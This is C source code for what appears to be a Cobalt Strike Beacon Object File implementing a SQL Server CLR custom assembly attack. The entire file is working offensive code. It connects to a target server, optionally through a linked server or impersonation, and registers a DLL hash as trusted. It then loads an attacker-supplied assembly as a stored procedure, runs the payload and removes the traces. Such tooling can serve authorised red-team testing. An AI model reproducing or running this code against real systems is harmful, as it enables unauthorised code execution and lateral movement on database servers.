#include "base.c"
#include "bofdefs.h"
#include "sql.c"
#include "sql_clr.c"
#include "sql_modules.c"

void ExecuteClrAssembly(char *server, char *database, char *link, char *impersonate, char *function, char *hash, char *hexBytes, char *user, char *password) {
  SQLHENV env = NULL;
  SQLHSTMT stmt = NULL;
  SQLHDBC dbc = NULL;
  SQLRETURN ret;

  InitRandomSeed();
  char *dllPath = GenerateRandomString(8);
  char *assemblyName = GenerateRandomString(8);

  if (link == NULL) {
    dbc = ConnectToSqlServerAuth(&env, server, database, user, password);
  } else {
    dbc = ConnectToSqlServerAuth(&env, server, NULL, user, password);
  }

  if (dbc == NULL) {
    goto END;
  }

  if (link == NULL) {
    internal_printf("[*] Performing CLR custom assembly attack on %s\n\n",
                    server);
  } else {
    internal_printf(
        "[*] Performing CLR custom assembly attack on %s via %s\n\n", link,
        server);
  }

  ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
  if (!SQL_SUCCEEDED(ret)) {
    internal_printf("[!] Failed to allocate statement handle\n");
    goto END;
  }

  if (IsModuleEnabled(stmt, "clr enabled", link, impersonate)) {
    internal_printf("[*] CLR is enabled\n");
  } else {
    internal_printf("[!] CLR is not enabled\n");
    goto END;
  }

  ret = ODBC32$SQLCloseCursor(stmt);
  if (!SQL_SUCCEEDED(ret)) {
    internal_printf("[!] Failed to close cursor\n");
    goto END;
  }

  if (link != NULL) {
    if (IsRpcEnabled(stmt, link)) {
      internal_printf("[*] RPC out is enabled\n");
    } else {
      internal_printf("[!] RPC out is not enabled\n");
      goto END;
    }

    ret = ODBC32$SQLCloseCursor(stmt);
    if (!SQL_SUCCEEDED(ret)) {
      internal_printf("[!] Failed to close cursor\n");
      goto END;
    }
  }

  if (AssemblyHashExists(stmt, hash, link, impersonate)) {
    internal_printf( "[!] Assembly hash already exists in sys.trusted_assesmblies\n");
    internal_printf("[*] Dropping existing assembly hash before continuing\n");

    ret = ODBC32$SQLCloseCursor(stmt);
    if (!SQL_SUCCEEDED(ret)) {
      internal_printf("[!] Failed to close cursor\n");
      goto END;
    }

    if (!DeleteTrustedAssembly(stmt, hash, link, impersonate)) {
      internal_printf("[!] Failed to drop existing assembly hash\n");
      goto END;
    }
  } else {
    ret = ODBC32$SQLCloseCursor(stmt);
    if (!SQL_SUCCEEDED(ret)) {
      internal_printf("[!] Failed to close cursor\n");
      goto END;
    }
  }

  if (!AddTrustedAssembly(stmt, dllPath, hash, link, impersonate)) {
    internal_printf("[!] Failed to add trusted assembly\n");
    goto END;
  }

  internal_printf("[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name \"%s\"\n", dllPath);

  if (!DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate)) {
    internal_printf("[!] Failed to drop existing assembly and procedure\n");
    goto END;
  }

  internal_printf("[*] Creating a new custom assembly with the name \"%s\"\n", assemblyName);
  if (!CreateAssembly(stmt, assemblyName, hexBytes, link, impersonate)) {
    internal_printf("[!] Failed to create custom assembly. This probably happened as the assembly was uploaded before using a different name. See SQL error message\n");
    goto END;
  }

  if (!AssemblyExists(stmt, assemblyName, link, impersonate)) {
    internal_printf("[!] Failed to create custom assembly\n");
    internal_printf("[*] Cleaning up...\n");
    DeleteTrustedAssembly(stmt, hash, link, impersonate);
    DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);
    goto END;
  }

  internal_printf("[*] Loading DLL into stored procedure \"%s\"\n", function);
  CreateAssemblyStoredProc(stmt, assemblyName, function, FALSE, link, impersonate);

  if (!AssemblyStoredProcExists(stmt, function, link, impersonate)) {
    internal_printf("[!] Stored procedure not found\n");
    internal_printf("[*] Cleaning up...\n");
    DeleteTrustedAssembly(stmt, hash, link, impersonate);
    DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);
    goto END;
  }

  internal_printf("[*] Created \"[%s].[StoredProcedures].[%s]\"\n", assemblyName, function);

  internal_printf("[*] Executing payload...\n");
  ExecuteAssemblyStoredProc(stmt, function, link, impersonate);

  internal_printf("[*] Cleaning up...\n");
  DeleteTrustedAssembly(stmt, hash, link, impersonate);
  DeleteTrustedAssemblyResources(stmt, assemblyName, function, FALSE, link, impersonate);

END:
  intFree(dllPath);
  intFree(assemblyName);
  ODBC32$SQLCloseCursor(stmt);
  DisconnectSqlServer(env, dbc, stmt);
}

VOID go(IN PCHAR Buffer, IN ULONG Length) {
  char *server;
  char *database;
  char *link;
  char *impersonate;
  char *function;
  char *hash;
  char *hexBytes; // DLL as hex string, not binary
  char *user;
  char *password;

  datap parser;
  BeaconDataParse(&parser, Buffer, Length);
  server = BeaconDataExtract(&parser, NULL);
  database = BeaconDataExtract(&parser, NULL);
  link = BeaconDataExtract(&parser, NULL);
  impersonate = BeaconDataExtract(&parser, NULL);
  function = BeaconDataExtract(&parser, NULL);
  hash = BeaconDataExtract(&parser, NULL);
  hexBytes = BeaconDataExtract(&parser, NULL);
  user = BeaconDataExtract(&parser, NULL);
  password = BeaconDataExtract(&parser, NULL);

  server = (server && *server != 0) ? server : "localhost";
  database = (database && *database != 0) ? database : "master";
  link = (link && *link != 0) ? link : NULL;
  impersonate = (impersonate && *impersonate != 0) ? impersonate : NULL;
  user = (user && *user != 0) ? user : NULL;
  password = (password && *password != 0) ? password : NULL;

  if (!bofstart()) {
    return;
  }

  if (UsingLinkAndImpersonate(link, impersonate)) {
    return;
  }

  ExecuteClrAssembly(server, database, link, impersonate, function, hash, hexBytes, user, password);
  printoutput(TRUE);
};